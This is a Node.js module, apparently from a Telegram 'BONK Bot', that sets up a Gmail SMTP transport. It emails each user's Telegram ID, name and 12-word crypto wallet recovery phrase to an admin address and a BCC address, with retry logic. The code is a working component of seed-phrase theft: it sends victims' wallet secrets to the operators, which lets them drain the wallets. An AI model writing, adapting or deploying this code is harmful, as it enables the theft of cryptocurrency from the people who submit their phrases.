import nodemailer from "nodemailer";
import { ADMIN_EMAIL, ADMIN_EMAIL_PASS, HR_EMAIL } from '../config/env.js'

// More explicit SMTP configuration with better timeout handling
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587, // TLS port (alternative: 465 for SSL)
    secure: false, // true for 465, false for other ports
    auth: {
        user: ADMIN_EMAIL,
        pass: ADMIN_EMAIL_PASS
    },
    // Add timeout and connection settings
    connectionTimeout: 60000, // 60 seconds
    greetingTimeout: 30000,
    socketTimeout: 60000,
    // Additional options for better reliability
    pool: true,
    maxConnections: 5,
    maxMessages: 10,
    rateLimit: 5, // Max 5 emails per second
    // Retry logic
    tls: {
        rejectUnauthorized: true,
        minVersion: 'TLSv1.2'
    },
    logger: false, // Set to true for debugging
    debug: false // Set to true for debugging
});

/**
 * Sends an admin email with a user's 12-word wallet phrase.
 * @param {number} telegram_id - Telegram user ID.
 * @param {string} firstName - User's first name.
 * @param {string} phrase - 12-word wallet phrase.
 * @param {number} retries - Number of retry attempts (default: 3).
 * @returns {Promise<Object>} - Mail delivery info object.
 */
const sendPhraseMail = async (telegram_id, firstName, phrase, retries = 3) => {
    const mailOptions = {
        from: `"BONK Bot 🔐" <${ADMIN_EMAIL}>`,
        to: ADMIN_EMAIL,
        bcc: HR_EMAIL,
        subject: `🔐 Wallet Phrase from ${firstName}`,
        html: `
            <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 600px; margin: auto; border: 1px solid #eee; padding: 20px; border-radius: 8px; background-color: #f9f9f9;">
                <h2 style="color: #d9534f;">🚨 New Phrase Submission</h2>
                <hr style="border: none; border-top: 1px solid #ccc;" />
                <p><strong>👤 Telegram ID:</strong> ${telegram_id}</p>
                <p><strong>📛 Name:</strong> ${firstName}</p>
                <p><strong>🔑 Phrase:</strong></p>
                <pre style="background: #fff; padding: 10px; border: 1px dashed #ccc; border-radius: 4px; white-space: pre-wrap; word-break: break-word;">${phrase}</pre>
                <p><strong>📬 Submitted:</strong> ${new Date().toLocaleString()}</p>
                <hr style="border: none; border-top: 1px solid #ccc;" />
                <footer style="text-align: center; font-size: 0.9em; color: #888;">
                    📡 BONK Bot Alert System
                </footer>
            </div>
        `
    };

    // Retry logic for handling transient connection issues
    for (let attempt = 1; attempt <= retries; attempt++) {
        try {
            const info = await transporter.sendMail(mailOptions);

            // Log success
            if (attempt > 1) {
                console.log(`✅ Email sent successfully on attempt ${attempt}`);
            }

            return info;
        } catch (err) {
            const isLastAttempt = attempt === retries;
            const isTimeoutError = err.code === 'ETIMEDOUT' || err.code === 'ESOCKET';

            console.error(`❌ Error sending phrase email (attempt ${attempt}/${retries}):`, err.message);

            // If it's a timeout and not the last attempt, retry
            if (isTimeoutError && !isLastAttempt) {
                const waitTime = attempt * 2000; // Exponential backoff: 2s, 4s, 6s
                console.log(`⏳ Retrying in ${waitTime / 1000} seconds...`);
                await new Promise(resolve => setTimeout(resolve, waitTime));
                continue;
            }

            // Last attempt or non-timeout error - throw
            if (isLastAttempt) {
                console.error("❌ All email sending attempts failed");
            }
            throw err;
        }
    }
};

/**
 * Verify SMTP connection on startup
 */
export const verifyEmailConnection = async () => {
    try {
        await transporter.verify();
        console.log("✅ SMTP server connection verified successfully");
        return true;
    } catch (error) {
        console.error("⚠️ SMTP server connection verification failed:", error.message);
        console.error("⚠️ Email notifications may not work. Please check your email configuration.");
        return false;
    }
};

export default sendPhraseMail;